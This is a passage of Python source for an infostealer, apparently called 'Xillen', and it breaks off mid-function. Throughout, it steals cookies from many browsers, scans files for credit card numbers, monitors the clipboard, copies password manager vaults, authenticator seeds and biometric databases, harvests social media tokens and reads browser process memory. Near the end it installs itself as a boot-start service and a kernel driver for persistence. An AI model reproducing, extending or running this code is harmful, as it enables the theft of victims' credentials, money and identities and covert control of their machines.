import os
import socket
import platform
import getpass
import psutil
import uuid
import requests
import re
from datetime import datetime
import sys
import sqlite3
import browser_cookie3
from PIL import ImageGrab
import telebot
import shutil
import re
import ctypes
import json
import platform
import socket
import uuid
import psutil
import datetime
import requests
import base64
from Crypto.Cipher import AES
from glob import glob
import tempfile
import getpass
import stat
import subprocess
import traceback
import zipfile
import time
import threading
import win32api
import win32con
import win32process
import win32com.client
import configparser
import xml.etree.ElementTree as ET
import winreg
import struct
import hashlib
import random
import string
from cryptography.fernet import Fernet
import pickle
import gzip
import io
import ctypes.wintypes
try:
    import fcntl
except ImportError:
    fcntl = None
import array
import mmap
import socket
import struct
import select
import shutil
import pathlib


class AdvancedCookieExtractor:
    def __init__(self):
        self.cookie_data = {}
        self.browser_paths = self._get_browser_paths()
    def _get_browser_paths(self):
        paths = {}
        if OS_TYPE == "Windows":
            appdata = os.environ.get('APPDATA', '')
            localappdata = os.environ.get('LOCALAPPDATA', '')
            userprofile = os.environ.get('USERPROFILE', '')
            paths = {
                'chrome': [
                    os.path.join(localappdata, 'Google', 'Chrome', 'User Data', 'Default'),
                    os.path.join(localappdata, 'Google', 'Chrome', 'User Data', 'Profile 1'),
                    os.path.join(localappdata, 'Google', 'Chrome', 'User Data', 'Profile 2')
                ],
                'firefox': [
                    os.path.join(appdata, 'Mozilla', 'Firefox', 'Profiles'),
                    os.path.join(userprofile, '.mozilla', 'firefox')
                ],
                'edge': [
                    os.path.join(localappdata, 'Microsoft', 'Edge', 'User Data', 'Default'),
                    os.path.join(localappdata, 'Microsoft', 'Edge', 'User Data', 'Profile 1')
                ],
                'opera': [
                    os.path.join(appdata, 'Opera Software', 'Opera Stable'),
                    os.path.join(appdata, 'Opera Software', 'Opera GX')
                ],
                'brave': [
                    os.path.join(localappdata, 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default')
                ]
            }
        else:
            home = os.path.expanduser('~')
            paths = {
                'chrome': [
                    os.path.join(home, '.config', 'google-chrome', 'Default'),
                    os.path.join(home, '.config', 'google-chrome', 'Profile 1')
                ],
                'firefox': [
                    os.path.join(home, '.mozilla', 'firefox')
                ],
                'edge': [
                    os.path.join(home, '.config', 'microsoft-edge', 'Default')
                ],
                'opera': [
                    os.path.join(home, '.config', 'opera'),
                    os.path.join(home, '.config', 'opera-beta')
                ]
            }
        return paths
    def extract_all_cookies(self):
        all_cookies = {}
        try:
            all_cookies.update(self._extract_with_browser_cookie3())
        except Exception as e:
            log(f"browser_cookie3 failed: {str(e)}")
        try:
            all_cookies.update(self._extract_manually())
        except Exception as e:
            log(f"Manual extraction failed: {str(e)}")
        return all_cookies
    def _extract_with_browser_cookie3(self):
        cookies = {}
        
        # Chromium-based browsers
        chromium_browsers = [
            'chrome', 'chromium', 'edge', 'brave', 'vivaldi', 'opera', 'yandex',
            'slimjet', 'comodo', 'srware', 'torch', 'blisk', 'epic', 'uran',
            'centaury', 'falkon', 'superbird', 'coccoc', 'qqbrowser', '360chrome',
            'sogou', 'liebao', 'qihu', 'maxthon', 'salamweb', 'arc', 'sidekick',
            'sigmaos', 'floorp', 'librewolf', 'ghost', 'konqueror', 'midori',
            'otter', 'palemoon', 'basilisk', 'waterfox', 'iceweasel', 'icecat',
            'torbrowser', 'iridium', 'ungoogled', 'iron', 'comodo_dragon', 'coolnovo',
            'slimbrowser', 'avant', 'lunascape', 'greenbrowser', 'theworld', 'tango',
            'rockmelt', 'flock', 'wyzo', 'swiftfox', 'swiftweasel', 'k_meleon',
            'camino', 'galeon'
        ]
        
        # Firefox-based browsers
        firefox_browsers = [
            'firefox', 'waterfox', 'palemoon', 'seamonkey', 'icecat', 'cyberfox',
            'torbrowser', 'librewolf', 'floorp', 'basilisk', 'iceweasel', 'icecat',
            'tor_browser', 'pale_moon', 'k_meleon', 'camino', 'galeon', 'konqueror',
            'midori', 'falkon', 'otter', 'swiftfox', 'swiftweasel', 'wyzo', 'flock',
            'rockmelt', 'tango', 'theworld', 'greenbrowser', 'lunascape', 'avant',
            'slimbrowser', 'coolnovo', 'comodo_dragon', 'iron', 'ungoogled', 'iridium'
        ]
        
        # Try Chromium-based browsers
        for browser in chromium_browsers:
            try:
                if browser == 'chrome':
                    cj = browser_cookie3.chrome()
                elif browser == 'chromium':
                    cj = browser_cookie3.chromium()
                elif browser == 'edge':
                    cj = browser_cookie3.edge()
                elif browser == 'brave':
                    cj = browser_cookie3.brave()
                elif browser == 'opera':
                    cj = browser_cookie3.opera()
                elif browser == 'vivaldi':
                    cj = browser_cookie3.vivaldi()
                elif browser == 'yandex':
                    cj = browser_cookie3.yandex()
                elif browser == 'tor_browser' or browser == 'torbrowser':
                    cj = browser_cookie3.chrome(domain_name='torbrowser')
                else:
                    continue
                    
                browser_cookies = []
                for cookie in cj:
                    browser_cookies.append({
                        'name': cookie.name,
                        'value': cookie.value,
                        'domain': cookie.domain,
                        'path': cookie.path,
                        'expires': cookie.expires
                    })
                if browser_cookies:
                    cookies[browser] = browser_cookies
            except Exception as e:
                log(f"Failed to extract {browser} cookies: {str(e)}")
                continue
        
        # Try Firefox-based browsers
        for browser in firefox_browsers:
            try:
                if browser == 'firefox':
                    cj = browser_cookie3.firefox()
                elif browser == 'waterfox':
                    cj = browser_cookie3.firefox(domain_name='waterfox')
                elif browser == 'palemoon':
                    cj = browser_cookie3.firefox(domain_name='palemoon')
                elif browser == 'seamonkey':
                    cj = browser_cookie3.firefox(domain_name='seamonkey')
                elif browser == 'icecat':
                    cj = browser_cookie3.firefox(domain_name='icecat')
                elif browser == 'cyberfox':
                    cj = browser_cookie3.firefox(domain_name='cyberfox')
                elif browser == 'tor_browser' or browser == 'torbrowser':
                    cj = browser_cookie3.firefox(domain_name='torbrowser')
                elif browser == 'librewolf':
                    cj = browser_cookie3.firefox(domain_name='librewolf')
                elif browser == 'floorp':
                    cj = browser_cookie3.firefox(domain_name='floorp')
                else:
                    continue
                    
                browser_cookies = []
                for cookie in cj:
                    browser_cookies.append({
                        'name': cookie.name,
                        'value': cookie.value,
                        'domain': cookie.domain,
                        'path': cookie.path,
                        'expires': cookie.expires
                    })
                if browser_cookies:
                    cookies[browser] = browser_cookies
            except Exception as e:
                log(f"Failed to extract {browser} cookies: {str(e)}")
                continue
                
        return cookies
    def _extract_manually(self):
        cookies = {}
        for browser, paths in self.browser_paths.items():
            browser_cookies = []
            for path in paths:
                if not os.path.exists(path):
                    continue
                try:
                    if browser == 'chrome' or browser == 'edge' or browser == 'brave':
                        browser_cookies.extend(self._extract_chrome_cookies(path))
                    elif browser == 'firefox':
                        browser_cookies.extend(self._extract_firefox_cookies(path))
                    elif browser == 'opera':
                        browser_cookies.extend(self._extract_opera_cookies(path))
                except Exception as e:
                    log(f"Failed to extract {browser} cookies from {path}: {str(e)}")
                    continue
            if browser_cookies:
                cookies[browser] = browser_cookies
        return cookies
    def _extract_chrome_cookies(self, profile_path):
        cookies = []
        cookie_path = os.path.join(profile_path, 'Cookies')
        if not os.path.exists(cookie_path):
            return cookies
        try:
            temp_cookie_path = os.path.join(tempfile.gettempdir(), f'cookies_{random.randint(1000, 9999)}.db')
            shutil.copy2(cookie_path, temp_cookie_path)
            conn = sqlite3.connect(temp_cookie_path)
            cursor = conn.cursor()
            cursor.execute("""
                SELECT name, value, host_key, path, expires_utc, is_secure, is_httponly
                FROM cookies
                WHERE value != ''
                LIMIT 1000
            """)
            for row in cursor.fetchall():
                cookies.append({
                    'name': row[0],
                    'value': row[1],
                    'domain': row[2],
                    'path': row[3],
                    'expires': row[4],
                    'secure': bool(row[5]),
                    'httponly': bool(row[6])
                })
            conn.close()
            os.remove(temp_cookie_path)
        except Exception as e:
            log(f"Failed to extract Chrome cookies: {str(e)}")
        return cookies
    def _extract_firefox_cookies(self, profile_path):
        cookies = []
        if os.path.isdir(profile_path):
            for item in os.listdir(profile_path):
                if item.endswith('.default') or item.endswith('.default-release'):
                    profile_dir = os.path.join(profile_path, item)
                    cookie_path = os.path.join(profile_dir, 'cookies.sqlite')
                    if os.path.exists(cookie_path):
                        cookies.extend(self._extract_firefox_cookies_from_file(cookie_path))
                        break
        return cookies
    def _extract_firefox_cookies_from_file(self, cookie_path):
        cookies = []
        try:
            temp_cookie_path = os.path.join(tempfile.gettempdir(), f'firefox_cookies_{random.randint(1000, 9999)}.db')
            shutil.copy2(cookie_path, temp_cookie_path)
            conn = sqlite3.connect(temp_cookie_path)
            cursor = conn.cursor()
            cursor.execute("""
                SELECT name, value, host, path, expiry, isSecure, isHttpOnly
                FROM moz_cookies
                WHERE value != ''
                LIMIT 1000
            """)
            for row in cursor.fetchall():
                cookies.append({
                    'name': row[0],
                    'value': row[1],
                    'domain': row[2],
                    'path': row[3],
                    'expires': row[4],
                    'secure': bool(row[5]),
                    'httponly': bool(row[6])
                })
            conn.close()
            os.remove(temp_cookie_path)
        except Exception as e:
            log(f"Failed to extract Firefox cookies: {str(e)}")
        return cookies
    def _extract_opera_cookies(self, profile_path):
        cookies = []
        cookie_path = os.path.join(profile_path, 'Cookies')
        if not os.path.exists(cookie_path):
            return cookies
        try:
            cookies.extend(self._extract_chrome_cookies(profile_path))
        except Exception as e:
            log(f"Failed to extract Opera cookies: {str(e)}")
        return cookies
class TelegramDataCollector:
    def __init__(self):
        self.telegram_clients = ['Telegram', 'Telegram Desktop', 'ayugram', 'Kotatogram', 'TelegramPortable', '64Gram', 'Unigram', 'TDesktop', 'Telegram.exe', 'ayugram.exe', 'Kotatogram.exe', '64Gram.exe']
        self.max_chunk_size = 45 * 1024 * 1024
    def get_all_drives(self):
        drives = []
        if OS_TYPE == "Windows":
            import string
            from ctypes import windll
            bitmask = windll.kernel32.GetLogicalDrives()
            for letter in string.ascii_uppercase:
                if bitmask & 1:
                    drives.append(f"{letter}:\\")
                bitmask >>= 1
        else:
            drives = ['/']
        return drives
		
		
class PaymentSystems:
    def __init__(self):
        self.payment_patterns = [
            r'\b4[0-9]{12}(?:[0-9]{3})?\b',
            r'\b5[1-5][0-9]{14}\b',
            r'\b3[47][0-9]{13}\b',
            r'\b6(?:011|5[0-9]{2})[0-9]{12}\b'
        ]
    def scan_credit_cards(self):
        cards_found = []
        search_paths = []
        if platform.system() == "Windows":
            search_paths = [
                os.environ.get('USERPROFILE', ''),
                os.environ.get('APPDATA', ''),
                os.environ.get('DOCUMENTS', ''),
            ]
        else:
            search_paths = [
                os.path.expanduser('~'),
                '/tmp',
                '/var'
            ]
        for search_path in search_paths:
            if not os.path.exists(search_path):
                continue
            for root, dirs, files in os.walk(search_path):
                for file in files:
                    if any(ext in file.lower() for ext in ['.txt', '.log', '.csv', '.db', '.sql']):
                        file_path = os.path.join(root, file)
                        try:
                            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                                content = f.read()
                                for pattern in self.payment_patterns:
                                    matches = re.findall(pattern, content)
                                    cards_found.extend(matches)
                        except:
                            pass
        return list(set(cards_found))
class BrowserFingerprinting:
    def __init__(self):
        self.fingerprint_data = {}
    def collect_browser_fingerprint(self):
        try:
            fingerprint = {
                'user_agent': self._get_user_agent(),
                'screen_resolution': self._get_screen_resolution(),
                'timezone': self._get_timezone(),
                'language': self._get_language(),
                'plugins': self._get_plugins(),
                'canvas_fingerprint': self._get_canvas_fingerprint(),
                'webgl_fingerprint': self._get_webgl_fingerprint(),
                'audio_fingerprint': self._get_audio_fingerprint()
            }
            return fingerprint
        except:
            return {}
    def _get_user_agent(self):
        try:
            if OS_TYPE == "Windows":
                import winreg
                key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings")
                ua = winreg.QueryValueEx(key, "User Agent")[0]
                winreg.CloseKey(key)
                return ua
        except:
            return "Unknown"
    def _get_screen_resolution(self):
        try:
            if OS_TYPE == "Windows":
                import ctypes
                user32 = ctypes.windll.user32
                return f"{user32.GetSystemMetrics(0)}x{user32.GetSystemMetrics(1)}"
        except:
            return "Unknown"
    def _get_timezone(self):
        try:
            import time
            return time.tzname[0]
        except:
            return "Unknown"
    def _get_language(self):
        try:
            import locale
            return locale.getdefaultlocale()[0]
        except:
            return "Unknown"
    def _get_plugins(self):
        plugins = []
        try:
            if OS_TYPE == "Windows":
                plugin_paths = [
                    os.path.join(os.environ['PROGRAMFILES'], 'Mozilla Firefox', 'plugins'),
                    os.path.join(os.environ['PROGRAMFILES(X86)'], 'Mozilla Firefox', 'plugins'),
                    os.path.join(os.environ['LOCALAPPDATA'], 'Google', 'Chrome', 'User Data', 'Default', 'Extensions')
                ]
                for path in plugin_paths:
                    if os.path.exists(path):
                        plugins.extend(os.listdir(path))
        except:
            pass
        return plugins
    def _get_canvas_fingerprint(self):
        try:
            import hashlib
            canvas_data = f"{self._get_screen_resolution()}{self._get_timezone()}{self._get_language()}"
            return hashlib.md5(canvas_data.encode()).hexdigest()
        except:
            return "Unknown"
    def _get_webgl_fingerprint(self):
        try:
            import hashlib
            webgl_data = f"WebGL{self._get_screen_resolution()}{self._get_timezone()}"
            return hashlib.sha256(webgl_data.encode()).hexdigest()
        except:
            return "Unknown"
    def _get_audio_fingerprint(self):
        try:
            import hashlib
            audio_data = f"Audio{self._get_timezone()}{self._get_language()}"
            return hashlib.md5(audio_data.encode()).hexdigest()
        except:
            return "Unknown"
class ClipboardMonitor:
    def __init__(self):
        self.clipboard_data = []
    def start_monitoring(self):
        try:
            if OS_TYPE == "Windows":
                import win32clipboard
                import win32con
                def monitor_clipboard():
                    try:
                        win32clipboard.OpenClipboard()
                        if win32clipboard.IsClipboardFormatAvailable(win32con.CF_TEXT):
                            data = win32clipboard.GetClipboardData()
                            if data and len(data) > 10:
                                self.clipboard_data.append({
                                    'data': data,
                                    'timestamp': datetime.datetime.now().isoformat(),
                                    'type': 'text'
                                })
                        win32clipboard.CloseClipboard()
                    except:
                        pass
                threading.Timer(2.0, monitor_clipboard).start()
                return True
        except:
            pass
        return False
    def get_clipboard_history(self):
        return self.clipboard_data
		
		
class PasswordManagerIntegration:
    def __init__(self):
        self.password_managers = {
            '1Password': self._extract_1password,
            'LastPass': self._extract_lastpass,
            'Bitwarden': self._extract_bitwarden,
            'Dashlane': self._extract_dashlane,
            'KeePass': self._extract_keepass,
            'RoboForm': self._extract_roboform
        }
    def extract_password_manager_data(self):
        extracted_data = {}
        for manager_name, extract_func in self.password_managers.items():
            try:
                data = extract_func()
                if data:
                    extracted_data[manager_name] = data
            except:
                pass
        return extracted_data
    def _extract_1password(self):
        data = []
        try:
            if OS_TYPE == "Windows":
                paths = [
                    os.path.join(os.environ['APPDATA'], '1Password'),
                    os.path.join(os.environ['LOCALAPPDATA'], '1Password')
                ]
            else:
                paths = [
                    os.path.expanduser('~/.config/1Password'),
                    os.path.expanduser('~/Library/Application Support/1Password')
                ]
            for path in paths:
                if os.path.exists(path):
                    for root, dirs, files in os.walk(path):
                        for file in files:
                            if any(ext in file.lower() for ext in ['.sqlite', '.db', '.json', '.opvault']):
                                file_path = os.path.join(root, file)
                                try:
                                    with open(file_path, 'rb') as f:
                                        content = f.read()
                                        data.append(f"1Password: {file_path}\n{base64.b64encode(content).decode()}")
                                except:
                                    pass
        except:
            pass
        return data
    def _extract_lastpass(self):
        data = []
        try:
            if OS_TYPE == "Windows":
                paths = [
                    os.path.join(os.environ['APPDATA'], 'LastPass'),
                    os.path.join(os.environ['LOCALAPPDATA'], 'LastPass')
                ]
            else:
                paths = [
                    os.path.expanduser('~/.config/lastpass'),
                    os.path.expanduser('~/Library/Application Support/LastPass')
                ]
            for path in paths:
                if os.path.exists(path):
                    for root, dirs, files in os.walk(path):
                        for file in files:
                            if any(ext in file.lower() for ext in ['.sqlite', '.db', '.json', '.lps']):
                                file_path = os.path.join(root, file)
                                try:
                                    with open(file_path, 'rb') as f:
                                        content = f.read()
                                        data.append(f"LastPass: {file_path}\n{base64.b64encode(content).decode()}")
                                except:
                                    pass
        except:
            pass
        return data
    def _extract_bitwarden(self):
        data = []
        try:
            if OS_TYPE == "Windows":
                paths = [
                    os.path.join(os.environ['APPDATA'], 'Bitwarden'),
                    os.path.join(os.environ['LOCALAPPDATA'], 'Bitwarden')
                ]
            else:
                paths = [
                    os.path.expanduser('~/.config/Bitwarden'),
                    os.path.expanduser('~/Library/Application Support/Bitwarden')
                ]
            for path in paths:
                if os.path.exists(path):
                    for root, dirs, files in os.walk(path):
                        for file in files:
                            if any(ext in file.lower() for ext in ['.sqlite', '.db', '.json', '.bwdb']):
                                file_path = os.path.join(root, file)
                                try:
                                    with open(file_path, 'rb') as f:
                                        content = f.read()
                                        data.append(f"Bitwarden: {file_path}\n{base64.b64encode(content).decode()}")
                                except:
                                    pass
        except:
            pass
        return data
    def _extract_dashlane(self):
        data = []
        try:
            if OS_TYPE == "Windows":
                paths = [
                    os.path.join(os.environ['APPDATA'], 'Dashlane'),
                    os.path.join(os.environ['LOCALAPPDATA'], 'Dashlane')
                ]
            else:
                paths = [
                    os.path.expanduser('~/.config/Dashlane'),
                    os.path.expanduser('~/Library/Application Support/Dashlane')
                ]
            for path in paths:
                if os.path.exists(path):
                    for root, dirs, files in os.walk(path):
                        for file in files:
                            if any(ext in file.lower() for ext in ['.sqlite', '.db', '.json', '.dash']):
                                file_path = os.path.join(root, file)
                                try:
                                    with open(file_path, 'rb') as f:
                                        content = f.read()
                                        data.append(f"Dashlane: {file_path}\n{base64.b64encode(content).decode()}")
                                except:
                                    pass
        except:
            pass
        return data
    def _extract_keepass(self):
        data = []
        try:
            if OS_TYPE == "Windows":
                paths = [
                    os.path.join(os.environ['USERPROFILE'], 'Documents'),
                    os.path.join(os.environ['DESKTOP'])
                ]
            else:
                paths = [
                    os.path.expanduser('~/Documents'),
                    os.path.expanduser('~/Desktop')
                ]
            for path in paths:
                if os.path.exists(path):
                    for root, dirs, files in os.walk(path):
                        for file in files:
                            if any(ext in file.lower() for ext in ['.kdbx', '.kdb', '.key']):
                                file_path = os.path.join(root, file)
                                try:
                                    with open(file_path, 'rb') as f:
                                        content = f.read()
                                        data.append(f"KeePass: {file_path}\n{base64.b64encode(content).decode()}")
                                except:
                                    pass
        except:
            pass
        return data
    def _extract_roboform(self):
        data = []
        try:
            if OS_TYPE == "Windows":
                paths = [
                    os.path.join(os.environ['APPDATA'], 'Siber Systems'),
                    os.path.join(os.environ['LOCALAPPDATA'], 'Siber Systems')
                ]
            else:
                paths = [
                    os.path.expanduser('~/.config/roboform'),
                    os.path.expanduser('~/Library/Application Support/RoboForm')
                ]
            for path in paths:
                if os.path.exists(path):
                    for root, dirs, files in os.walk(path):
                        for file in files:
                            if any(ext in file.lower() for ext in ['.sqlite', '.db', '.json', '.rf']):
                                file_path = os.path.join(root, file)
                                try:
                                    with open(file_path, 'rb') as f:
                                        content = f.read()
                                        data.append(f"RoboForm: {file_path}\n{base64.b64encode(content).decode()}")
                                except:
                                    pass
        except:
            pass
        return data
class SocialMediaTokens:
    def __init__(self):
        self.social_platforms = {
            'Instagram': self._extract_instagram,
            'TikTok': self._extract_tiktok,
            'Twitter': self._extract_twitter,
            'Facebook': self._extract_facebook,
            'LinkedIn': self._extract_linkedin,
            'Snapchat': self._extract_snapchat,
            'YouTube': self._extract_youtube,
            'Reddit': self._extract_reddit
        }
    def extract_social_tokens(self):
        extracted_tokens = {}
        for platform_name, extract_func in self.social_platforms.items():
            try:
                tokens = extract_func()
                if tokens:
                    extracted_tokens[platform_name] = tokens
            except:
                pass
        return extracted_tokens
    def _extract_instagram(self):
        tokens = []
        try:
            if OS_TYPE == "Windows":
                paths = [
                    os.path.join(os.environ['APPDATA'], 'Instagram'),
                    os.path.join(os.environ['LOCALAPPDATA'], 'Instagram')
                ]
            else:
                paths = [
                    os.path.expanduser('~/.config/instagram'),
                    os.path.expanduser('~/Library/Application Support/Instagram')
                ]
            for path in paths:
                if os.path.exists(path):
                    for root, dirs, files in os.walk(path):
                        for file in files:
                            if any(ext in file.lower() for ext in ['.json', '.db', '.sqlite', '.token']):
                                file_path = os.path.join(root, file)
                                try:
                                    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                                        content = f.read()
                                        if 'token' in content.lower() or 'session' in content.lower():
                                            tokens.append(f"Instagram: {file_path}\n{content}")
                                except:
                                    pass
        except:
            pass
        return tokens
    def _extract_tiktok(self):
        tokens = []
        try:
            if OS_TYPE == "Windows":
                paths = [
                    os.path.join(os.environ['APPDATA'], 'TikTok'),
                    os.path.join(os.environ['LOCALAPPDATA'], 'TikTok')
                ]
            else:
                paths = [
                    os.path.expanduser('~/.config/tiktok'),
                    os.path.expanduser('~/Library/Application Support/TikTok')
                ]
            for path in paths:
                if os.path.exists(path):
                    for root, dirs, files in os.walk(path):
                        for file in files:
                            if any(ext in file.lower() for ext in ['.json', '.db', '.sqlite', '.token']):
                                file_path = os.path.join(root, file)
                                try:
                                    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                                        content = f.read()
                                        if 'token' in content.lower() or 'session' in content.lower():
                                            tokens.append(f"TikTok: {file_path}\n{content}")
                                except:
                                    pass
        except:
            pass
        return tokens
    def _extract_twitter(self):
        tokens = []
        try:
            if OS_TYPE == "Windows":
                paths = [
                    os.path.join(os.environ['APPDATA'], 'Twitter'),
                    os.path.join(os.environ['LOCALAPPDATA'], 'Twitter')
                ]
            else:
                paths = [
                    os.path.expanduser('~/.config/twitter'),
                    os.path.expanduser('~/Library/Application Support/Twitter')
                ]
            for path in paths:
                if os.path.exists(path):
                    for root, dirs, files in os.walk(path):
                        for file in files:
                            if any(ext in file.lower() for ext in ['.json', '.db', '.sqlite', '.token']):
                                file_path = os.path.join(root, file)
                                try:
                                    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                                        content = f.read()
                                        if 'token' in content.lower() or 'session' in content.lower():
                                            tokens.append(f"Twitter: {file_path}\n{content}")
                                except:
                                    pass
        except:
            pass
        return tokens
    def _extract_facebook(self):
        tokens = []
        try:
            if OS_TYPE == "Windows":
                paths = [
                    os.path.join(os.environ['APPDATA'], 'Facebook'),
                    os.path.join(os.environ['LOCALAPPDATA'], 'Facebook')
                ]
            else:
                paths = [
                    os.path.expanduser('~/.config/facebook'),
                    os.path.expanduser('~/Library/Application Support/Facebook')
                ]
            for path in paths:
                if os.path.exists(path):
                    for root, dirs, files in os.walk(path):
                        for file in files:
                            if any(ext in file.lower() for ext in ['.json', '.db', '.sqlite', '.token']):
                                file_path = os.path.join(root, file)
                                try:
                                    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                                        content = f.read()
                                        if 'token' in content.lower() or 'session' in content.lower():
                                            tokens.append(f"Facebook: {file_path}\n{content}")
                                except:
                                    pass
        except:
            pass
        return tokens
    def _extract_linkedin(self):
        tokens = []
        try:
            if OS_TYPE == "Windows":
                paths = [
                    os.path.join(os.environ['APPDATA'], 'LinkedIn'),
                    os.path.join(os.environ['LOCALAPPDATA'], 'LinkedIn')
                ]
            else:
                paths = [
                    os.path.expanduser('~/.config/linkedin'),
                    os.path.expanduser('~/Library/Application Support/LinkedIn')
                ]
            for path in paths:
                if os.path.exists(path):
                    for root, dirs, files in os.walk(path):
                        for file in files:
                            if any(ext in file.lower() for ext in ['.json', '.db', '.sqlite', '.token']):
                                file_path = os.path.join(root, file)
                                try:
                                    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                                        content = f.read()
                                        if 'token' in content.lower() or 'session' in content.lower():
                                            tokens.append(f"LinkedIn: {file_path}\n{content}")
                                except:
                                    pass
        except:
            pass
        return tokens
    def _extract_snapchat(self):
        tokens = []
        try:
            if OS_TYPE == "Windows":
                paths = [
                    os.path.join(os.environ['APPDATA'], 'Snapchat'),
                    os.path.join(os.environ['LOCALAPPDATA'], 'Snapchat')
                ]
            else:
                paths = [
                    os.path.expanduser('~/.config/snapchat'),
                    os.path.expanduser('~/Library/Application Support/Snapchat')
                ]
            for path in paths:
                if os.path.exists(path):
                    for root, dirs, files in os.walk(path):
                        for file in files:
                            if any(ext in file.lower() for ext in ['.json', '.db', '.sqlite', '.token']):
                                file_path = os.path.join(root, file)
                                try:
                                    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                                        content = f.read()
                                        if 'token' in content.lower() or 'session' in content.lower():
                                            tokens.append(f"Snapchat: {file_path}\n{content}")
                                except:
                                    pass
        except:
            pass
        return tokens
    def _extract_youtube(self):
        tokens = []
        try:
            if OS_TYPE == "Windows":
                paths = [
                    os.path.join(os.environ['APPDATA'], 'Google', 'Chrome', 'User Data', 'Default'),
                    os.path.join(os.environ['LOCALAPPDATA'], 'Google', 'Chrome', 'User Data', 'Default')
                ]
            else:
                paths = [
                    os.path.expanduser('~/.config/google-chrome/Default'),
                    os.path.expanduser('~/Library/Application Support/Google/Chrome/Default')
                ]
            for path in paths:
                if os.path.exists(path):
                    for root, dirs, files in os.walk(path):
                        for file in files:
                            if 'youtube' in file.lower() and any(ext in file.lower() for ext in ['.json', '.db', '.sqlite']):
                                file_path = os.path.join(root, file)
                                try:
                                    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                                        content = f.read()
                                        if 'token' in content.lower() or 'session' in content.lower():
                                            tokens.append(f"YouTube: {file_path}\n{content}")
                                except:
                                    pass
        except:
            pass
        return tokens
    def _extract_reddit(self):
        tokens = []
        try:
            if OS_TYPE == "Windows":
                paths = [
                    os.path.join(os.environ['APPDATA'], 'Reddit'),
                    os.path.join(os.environ['LOCALAPPDATA'], 'Reddit')
                ]
            else:
                paths = [
                    os.path.expanduser('~/.config/reddit'),
                    os.path.expanduser('~/Library/Application Support/Reddit')
                ]
            for path in paths:
                if os.path.exists(path):
                    for root, dirs, files in os.walk(path):
                        for file in files:
                            if any(ext in file.lower() for ext in ['.json', '.db', '.sqlite', '.token']):
                                file_path = os.path.join(root, file)
                                try:
                                    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                                        content = f.read()
                                        if 'token' in content.lower() or 'session' in content.lower():
                                            tokens.append(f"Reddit: {file_path}\n{content}")
                                except:
                                    pass
        except:
            pass
        return tokens
		
class UEFIPersistence:
    def __init__(self):
        pass
    def install_uefi_module(self):
        try:
            if OS_TYPE != "Windows":
                return False
            efi_path = "C:\\Windows\\System32\\drivers\\XillenUEFI.sys"
            shutil.copy2(sys.argv[0], efi_path)
            key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\XillenUEFI")
            winreg.SetValueEx(key, "Type", 0, winreg.REG_DWORD, 1)
            winreg.SetValueEx(key, "Start", 0, winreg.REG_DWORD, 0)
            winreg.SetValueEx(key, "ErrorControl", 0, winreg.REG_DWORD, 1)
            winreg.SetValueEx(key, "ImagePath", 0, winreg.REG_SZ, efi_path)
            winreg.CloseKey(key)
            return True
        except:
            return False
class MemoryDumper:
    def __init__(self):
        pass
    def dump_browser_memory(self):
        try:
            for proc in psutil.process_iter(['pid', 'name']):
                if any(browser in proc.info['name'].lower() for browser in ['chrome', 'firefox', 'edge', 'opera']):
                    try:
                        process = psutil.Process(proc.info['pid'])
                        memory_maps = process.memory_maps()
                        for mem_map in memory_maps:
                            if mem_map.path and 'session' in mem_map.path.lower():
                                self._dump_memory_region(proc.info['pid'], mem_map.addr, mem_map.size)
                    except:
                        pass
        except:
            pass
    def _dump_memory_region(self, pid, address, size):
        try:
            if OS_TYPE != "Windows":
                return
            process_handle = ctypes.windll.kernel32.OpenProcess(0x1F0FFF, False, pid)
            if not process_handle:
                return
            buffer = ctypes.create_string_buffer(size)
            bytes_read = ctypes.c_size_t()
            ctypes.windll.kernel32.ReadProcessMemory(process_handle, address, buffer, size, ctypes.byref(bytes_read))
            dump_path = f"memory_dump_{pid}_{address:x}.bin"
            with open(dump_path, 'wb') as f:
                f.write(buffer.raw)
            ctypes.windll.kernel32.CloseHandle(process_handle)
        except:
            pass
class TOTPCollector:
    def __init__(self):
        self.auth_paths = [
            "Google\\Authenticator",
            "Microsoft\\Authenticator", 
            "Authy",
            "LastPass",
            "Dashlane",
            "1Password"
        ]
    def collect_totp_seeds(self):
        totp_data = []
        for auth_path in self.auth_paths:
            full_path = os.path.join(os.environ['APPDATA'], auth_path)
            if os.path.exists(full_path):
                for root, dirs, files in os.walk(full_path):
                    for file in files:
                        if any(ext in file.lower() for ext in ['.db', '.sqlite', '.json', '.dat']):
                            file_path = os.path.join(root, file)
                            try:
                                with open(file_path, 'rb') as f:
                                    content = f.read()
                                    totp_data.append(f"TOTP: {file_path}\n{base64.b64encode(content).decode()}")
                            except:
                                pass
        return totp_data
class BiometricCollector:
    def __init__(self):
        pass
    def collect_biometric_data(self):
        bio_data = []
        try:
            if OS_TYPE == "Windows":
                bio_path = "C:\\Windows\\System32\\WinBioDatabase"
                if os.path.exists(bio_path):
                    for root, dirs, files in os.walk(bio_path):
                        for file in files:
                            file_path = os.path.join(root, file)
                            try:
                                with open(file_path, 'rb') as f:
                                    content = f.read()
                                    bio_data.append(f"Biometric: {file_path}\n{base64.b64encode(content).decode()}")
                            except:
                                pass
        except:
            pass
        return bio_data
class KernelModeExecutor:
    def __init__(self):
        self.driver_name = "XillenKernel.sys"
    def load_kernel_driver(self):
        try:
            if OS_TYPE != "Windows":
                return False
            driver_path = f"C:\\Windows\\System32\\drivers\\{self.driver_name}"
            shutil.copy2(sys.argv[0], driver_path)
            sc_handle = ctypes.windll.advapi32.OpenSCManagerA(None, None, 0xF003F)
            if not sc_handle:
                return False
            service_handle = ctypes.windll.advapi32.CreateServiceA(
                sc_handle, "XillenKernel", "Xillen Kernel Service",
                0xF01FF, 1, 3, 0, driver_path, None, None, None, None, None
            )
            if not service_handle:
                ctypes.windll.advapi32.CloseServiceHandle(sc_handle)
                return False
            ctypes.windll.advapi32.StartServiceA(service_handle, 0, None)
